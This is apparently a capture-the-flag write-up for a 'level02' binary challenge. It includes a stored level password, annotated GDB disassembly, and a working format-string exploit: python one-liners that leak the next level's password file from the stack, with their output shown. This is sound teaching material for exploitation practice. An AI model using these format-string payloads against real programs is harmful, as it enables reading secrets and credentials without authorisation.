login : pw
	level02 : PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv

################################################
GDB
################################################

=> disas main
	0x0000000000400814 <+0>:	push   rbp
	0x0000000000400815 <+1>:	mov    rbp,rsp
	0x0000000000400818 <+4>:	sub    rsp,0x120
		=> p/d 0x120
			288
		# At most 288 bytes allocated on the stack for main function
		# 64 bits program

	0x000000000040081f <+11>:	mov    DWORD PTR [rbp-0x114],edi
		# Local var in [rbp-0x114], let's call it 'a'

	0x0000000000400825 <+17>:	mov    QWORD PTR [rbp-0x120],rsi
		# Local var in [rbp-0x120], let's call it 'b'

	0x000000000040082c <+24>:	lea    rdx,[rbp-0x70]
		# Local var in [rbp-0x70], let's call it 'buf'

	0x0000000000400830 <+28>:	mov    eax,0x0
	0x0000000000400835 <+33>:	mov    ecx,0xc
	0x000000000040083a <+38>:	mov    rdi,rdx
	0x000000000040083d <+41>:	rep stos QWORD PTR es:[rdi],rax
		# String repetition
		# Counter ecx = 0xc = 12
		# QWORD = Quadruple WORD | WORD = 2 bytes => 12 * 2 * 4 = 96
		# Set each byte in rdi pointer to eax value which is 0
		# rdi is local var buf address
		# This is equivalent to bzero(buf, 96)

	0x0000000000400840 <+44>:	mov    rdx,rdi
	0x0000000000400843 <+47>:	mov    DWORD PTR [rdx],eax
		# Set rdx = buf + 96 = eax = 0 (4 bytes)
		# Taking into account previous instructions
		# This is equivalent to bzero(buf, 100)

	0x0000000000400845 <+49>:	add    rdx,0x4
	0x0000000000400849 <+53>:	lea    rdx,[rbp-0xa0]
		# Local variable in [rbp-0xa0], let's call it 'buf2'
		# I'll call the first allocated but 'buf1'

	0x0000000000400850 <+60>:	mov    eax,0x0
	0x0000000000400855 <+65>:	mov    ecx,0x5
	0x000000000040085a <+70>:	mov    rdi,rdx
	0x000000000040085d <+73>:	rep stos QWORD PTR es:[rdi],rax
	0x0000000000400860 <+76>:	mov    rdx,rdi
	0x0000000000400863 <+79>:	mov    BYTE PTR [rdx],al
		# Similar main+28 up to main+47
		# 5 * 4 * 2 = 40
		# al is used at the end (lower 8 bits)
		# This is equivalent to bzero(buf2, 41)

	0x0000000000400865 <+81>:	add    rdx,0x1
	0x0000000000400869 <+85>:	lea    rdx,[rbp-0x110]
		# Local variable in [rbp-0x110], let's call it 'buf3'

	0x0000000000400870 <+92>:	mov    eax,0x0
	0x0000000000400875 <+97>:	mov    ecx,0xc
	0x000000000040087a <+102>:	mov    rdi,rdx
	0x000000000040087d <+105>:	rep stos QWORD PTR es:[rdi],rax
	0x0000000000400880 <+108>:	mov    rdx,rdi
	0x0000000000400883 <+111>:	mov    DWORD PTR [rdx],eax
		# Similar main+28 up to main+47
		# 12 * 4 * 2 = 96
		# This is equivalent to bzero(buf3, 100)

	0x0000000000400885 <+113>:	add    rdx,0x4
	0x0000000000400889 <+117>:	mov    QWORD PTR [rbp-0x8],0x0
	0x0000000000400891 <+125>:	mov    DWORD PTR [rbp-0xc],0x0
		# [rbp-0x8] set up to 0
		# [rbp-0xc] set up to 0

	0x0000000000400898 <+132>:	mov    edx,0x400bb0
	0x000000000040089d <+137>:	mov    eax,0x400bb2
	0x00000000004008a2 <+142>:	mov    rsi,rdx
	0x00000000004008a5 <+145>:	mov    rdi,rax
	0x00000000004008a8 <+148>:	call   0x400700 <fopen@plt>
	0x00000000004008ad <+153>:	mov    QWORD PTR [rbp-0x8],rax
		=> x/s 0x400bb0
			0x400bb0:	 "r"
		=> x/s 0x400bb2
			0x400bb2:	 "/home/users/level03/.pass"
		# stores return value in [rbp-0x8], lets call it 'file'

	0x00000000004008b1 <+157>:	cmp    QWORD PTR [rbp-0x8],0x0
	0x00000000004008b6 <+162>:	jne    0x4008e6 <main+210>
		# [rbp-0x8] = var 'file'
		# Jump to main+162 if file != 0

	0x00000000004008b8 <+164>:	mov    rax,QWORD PTR [rip+0x200991]        # 0x601250 <stderr@@GLIBC_2.2.5>
	0x00000000004008bf <+171>:	mov    rdx,rax
	0x00000000004008c2 <+174>:	mov    eax,0x400bd0
	0x00000000004008c7 <+179>:	mov    rcx,rdx
	0x00000000004008ca <+182>:	mov    edx,0x24
	0x00000000004008cf <+187>:	mov    esi,0x1
	0x00000000004008d4 <+192>:	mov    rdi,rax
	0x00000000004008d7 <+195>:	call   0x400720 <fwrite@plt>
		=> x/s 0x400bd0
			0x400bd0:	 "ERROR: failed to open password file\n"
		=> p/d 0x24
			36
		# 64 bits, parameters are passed through registers
		# ft(rdi, rsi, rdx, rcx, r8, r9)

	0x00000000004008dc <+200>:	mov    edi,0x1
	0x00000000004008e1 <+205>:	call   0x400710 <exit@plt>
		# exit(1)

	0x00000000004008e6 <+210>:	lea    rax,[rbp-0xa0]
	0x00000000004008ed <+217>:	mov    rdx,QWORD PTR [rbp-0x8]
	0x00000000004008f1 <+221>:	mov    rcx,rdx
	0x00000000004008f4 <+224>:	mov    edx,0x29
	0x00000000004008f9 <+229>:	mov    esi,0x1
	0x00000000004008fe <+234>:	mov    rdi,rax
	0x0000000000400901 <+237>:	call   0x400690 <fread@plt>
	0x0000000000400906 <+242>:	mov    DWORD PTR [rbp-0xc],eax
		=> p/d 0x29
			41
		# [rbp-0xa0] = var 'buf2'
		# [rbp-0x8] = var 'file'
		# stores return value in [rbp-0xc], lets call it 'c'

	0x0000000000400909 <+245>:	lea    rax,[rbp-0xa0]
	0x0000000000400910 <+252>:	mov    esi,0x400bf5
	0x0000000000400915 <+257>:	mov    rdi,rax
	0x0000000000400918 <+260>:	call   0x4006d0 <strcspn@plt>
	0x000000000040091d <+265>:	mov    BYTE PTR [rbp+rax*1-0xa0],0x0
		=> x/s 0x400bf5
			0x400bf5:	 "\n"
		# [rbp-0xa0] = var 'buf2'
		# buf2[return value] = 0

	0x0000000000400925 <+273>:	cmp    DWORD PTR [rbp-0xc],0x29
	0x0000000000400929 <+277>:	je     0x40097d <main+361>
		=> p/d 0x29
			41
		# [rbp-0xc] = variable 'c' (return value from fread)
		# Jump if c = 41 to main+361

	0x000000000040092b <+279>:	mov    rax,QWORD PTR [rip+0x20091e]        # 0x601250 <stderr@@GLIBC_2.2.5>
	0x0000000000400932 <+286>:	mov    rdx,rax
	0x0000000000400935 <+289>:	mov    eax,0x400bf8
	0x000000000040093a <+294>:	mov    rcx,rdx
	0x000000000040093d <+297>:	mov    edx,0x24
	0x0000000000400942 <+302>:	mov    esi,0x1
	0x0000000000400947 <+307>:	mov    rdi,rax
	0x000000000040094a <+310>:	call   0x400720 <fwrite@plt>
		=> x/s 0x400bf8
			0x400bf8:	 "ERROR: failed to read password file\n"
		=> p/d 0x24
			36

	0x000000000040094f <+315>:	mov    rax,QWORD PTR [rip+0x2008fa]        # 0x601250 <stderr@GLIBC_2.2.5>
	0x0000000000400956 <+322>:	mov    rdx,rax
	0x0000000000400959 <+325>:	mov    eax,0x400bf8
	0x000000000040095e <+330>:	mov    rcx,rdx
	0x0000000000400961 <+333>:	mov    edx,0x24
	0x0000000000400966 <+338>:	mov    esi,0x1
	0x000000000040096b <+343>:	mov    rdi,rax
	0x000000000040096e <+346>:	call   0x400720 <fwrite@plt>
		# Same as previous set of instructions

	0x0000000000400973 <+351>:	mov    edi,0x1
	0x0000000000400978 <+356>:	call   0x400710 <exit@plt>
		# exit(1)

	0x000000000040097d <+361>:	mov    rax,QWORD PTR [rbp-0x8]
	0x0000000000400981 <+365>:	mov    rdi,rax
	0x0000000000400984 <+368>:	call   0x4006a0 <fclose@plt>
		# [rbp-0x8] = var 'file'
		# Jumped here if c was equal to 0, main+277

	0x0000000000400989 <+373>:	mov    edi,0x400c20
	0x000000000040098e <+378>:	call   0x400680 <puts@plt>
	0x0000000000400993 <+383>:	mov    edi,0x400c50
	0x0000000000400998 <+388>:	call   0x400680 <puts@plt>
	0x000000000040099d <+393>:	mov    edi,0x400c80
	0x00000000004009a2 <+398>:	call   0x400680 <puts@plt>
	0x00000000004009a7 <+403>:	mov    edi,0x400cb0
	0x00000000004009ac <+408>:	call   0x400680 <puts@plt>
		=> x/s 0x400c20
			0x400c20:	 "===== [ Secure Access System v1.0 ] ====="
		=> x/s 0x400c50
			0x400c50:	 "/", '*' <repeats 39 times>, "\\"
		=> x/s 0x400c80
			0x400c80:	 "| You must login to access this system. |"
		=> x/s 0x400cb0
			0x400cb0:	 "\\", '*' <repeats 38 times>, "/"

	0x00000000004009b1 <+413>:	mov    eax,0x400cd9
	0x00000000004009b6 <+418>:	mov    rdi,rax
	0x00000000004009b9 <+421>:	mov    eax,0x0
	0x00000000004009be <+426>:	call   0x4006c0 <printf@plt>
		=> x/s 0x400cd9
			0x400cd9:	 "--[ Username: "

	0x00000000004009c3 <+431>:	mov    rax,QWORD PTR [rip+0x20087e]        # 0x601248 <stdin@@GLIBC_2.2.5>
	0x00000000004009ca <+438>:	mov    rdx,rax
	0x00000000004009cd <+441>:	lea    rax,[rbp-0x70]
	0x00000000004009d1 <+445>:	mov    esi,0x64
	0x00000000004009d6 <+450>:	mov    rdi,rax
	0x00000000004009d9 <+453>:	call   0x4006f0 <fgets@plt>
		=> p/d 0x64
			100
		# [rbp-0x70] = var 'buf1'

	0x00000000004009de <+458>:	lea    rax,[rbp-0x70]
	0x00000000004009e2 <+462>:	mov    esi,0x400bf5
	0x00000000004009e7 <+467>:	mov    rdi,rax
	0x00000000004009ea <+470>:	call   0x4006d0 <strcspn@plt>
	0x00000000004009ef <+475>:	mov    BYTE PTR [rbp+rax*1-0x70],0x0
		=> x/s 0x400bf5
			0x400bf5:	 "\n"
		# [rbp-0x70] = var 'buf1'
		# buf1[return value] = 0

	0x00000000004009f4 <+480>:	mov    eax,0x400ce8
	0x00000000004009f9 <+485>:	mov    rdi,rax
	0x00000000004009fc <+488>:	mov    eax,0x0
	0x0000000000400a01 <+493>:	call   0x4006c0 <printf@plt>
		=> x/s 0x400ce8
			0x400ce8:	 "--[ Password: "

	0x0000000000400a06 <+498>:	mov    rax,QWORD PTR [rip+0x20083b]        # 0x601248 <stdin@@GLIBC_2.2.5>
	0x0000000000400a0d <+505>:	mov    rdx,rax
	0x0000000000400a10 <+508>:	lea    rax,[rbp-0x110]
	0x0000000000400a17 <+515>:	mov    esi,0x64
	0x0000000000400a1c <+520>:	mov    rdi,rax
	0x0000000000400a1f <+523>:	call   0x4006f0 <fgets@plt>
		=> p/d 0x64
			100
		# [rbp-0x110] = var 'buf3'

	0x0000000000400a24 <+528>:	lea    rax,[rbp-0x110]
	0x0000000000400a2b <+535>:	mov    esi,0x400bf5
	0x0000000000400a30 <+540>:	mov    rdi,rax
	0x0000000000400a33 <+543>:	call   0x4006d0 <strcspn@plt>
	0x0000000000400a38 <+548>:	mov    BYTE PTR [rbp+rax*1-0x110],0x0
		=> x/s 0x400bf5
			0x400bf5:	 "\n"
		# [rbp-0x110] = var 'buf3'
		# buf3[return value] = 0

	0x0000000000400a40 <+556>:	mov    edi,0x400cf8
	0x0000000000400a45 <+561>:	call   0x400680 <puts@plt>
		x/s 0x400cf8
			0x400cf8:	 '*' <repeats 41 times>

	0x0000000000400a4a <+566>:	lea    rcx,[rbp-0x110]
	0x0000000000400a51 <+573>:	lea    rax,[rbp-0xa0]
	0x0000000000400a58 <+580>:	mov    edx,0x29
	0x0000000000400a5d <+585>:	mov    rsi,rcx
	0x0000000000400a60 <+588>:	mov    rdi,rax
	0x0000000000400a63 <+591>:	call   0x400670 <strncmp@plt>
	0x0000000000400a68 <+596>:	test   eax,eax
	0x0000000000400a6a <+598>:	jne    0x400a96 <main+642>
		=> p/d 0x29
			41
		# [rbp-0x110] = 'buf3'
		# [rbp-0xa0] = 'buf2'
		# Jump to main+642 if return value is not 0

	0x0000000000400a6c <+600>:	mov    eax,0x400d22
	0x0000000000400a71 <+605>:	lea    rdx,[rbp-0x70]
	0x0000000000400a75 <+609>:	mov    rsi,rdx
	0x0000000000400a78 <+612>:	mov    rdi,rax
	0x0000000000400a7b <+615>:	mov    eax,0x0
	0x0000000000400a80 <+620>:	call   0x4006c0 <printf@plt>
		=> x/s 0x400d22
			0x400d22:	 "Greetings, %s!\n"
	# [rbp-0x70] = 'buf1'

	0x0000000000400a85 <+625>:	mov    edi,0x400d32
	0x0000000000400a8a <+630>:	call   0x4006b0 <system@plt>
		=> x/s 0x400d32
			0x400d32:	 "/bin/sh"

	0x0000000000400a8f <+635>:	mov    eax,0x0
	0x0000000000400a94 <+640>:	leave  
	0x0000000000400a95 <+641>:	ret    
		# return value is 0

	0x0000000000400a96 <+642>:	lea    rax,[rbp-0x70]
	0x0000000000400a9a <+646>:	mov    rdi,rax
	0x0000000000400a9d <+649>:	mov    eax,0x0
	0x0000000000400aa2 <+654>:	call   0x4006c0 <printf@plt>
		# Jumped here if strncmp != 0 in main+598
		# [rbp-0x70] = 'buf1'
		# printf(buf1), possible format string attack

	0x0000000000400aa7 <+659>:	mov    edi,0x400d3a
	0x0000000000400aac <+664>:	call   0x400680 <puts@plt>
		=> x/s 0x400d3a
			0x400d3a:	 " does not have access!"

	0x0000000000400ab1 <+669>:	mov    edi,0x1
	0x0000000000400ab6 <+674>:	call   0x400710 <exit@plt>
		# exit(1)

################################################
SUMMARY
################################################

.pass file is opened, if failed, it exits
	We need to make our test our of gdb
	Read input stored in buf2
read 100 stored in buf1
	We can store 100 bytes in buf1, without '\n' (strcspn)
read 100 stored in buf3
	We can store 100 bytes in buf3, without '\n' (strcspn)
strncmp buf2, buf3, 41 bytes
	If returns 0, starts a shell
printf called with buf1 as only arg, possible format string attack

strncmp compares buf2 (content of .pass file) and compares it with buf3 which is one of our input
	We cant find out what buf2 contains
	We cant start a shell this way

We need to use the format string attack to display the content of buf2

################################################
EXPLOIT
################################################

# stack size in main = 0x120 = 288 = $ebp-$esp after allocating stack
# buf2 starts in = [ebp-0xa0] | 0xa0 = 160
# ebp point of vue from main: buf2 starts in 288-160 = 128
# esp point of vue from main: buf2 starts in 288-128 = 160
# We remember from rainfall that printf format string attack starts after esp
# buf2 should start at least in in (160+8) / 8 = 21
# Let's keep in mind the flag is 41 byte long
# 41 / 8 = 5.125
# We need to display 6 pointers

=> python -c 'print "%21$p %22$p %23$p %24$p %25$p"+"\n" + "bbbb"' | ./level02
	(nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 does not have access!	
	# Oupsy, I must have forgotten something
	# My offset estimation failed by 8 bytes

=> python -c 'print "%22$p %23$p %24$p %25$p %26$p %27$p"+"\n" + "bbbb"' | ./level02
	0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) does not have access!
	# Right 41th character is just the null one

=> python3 Ressources/hex_to_str.py
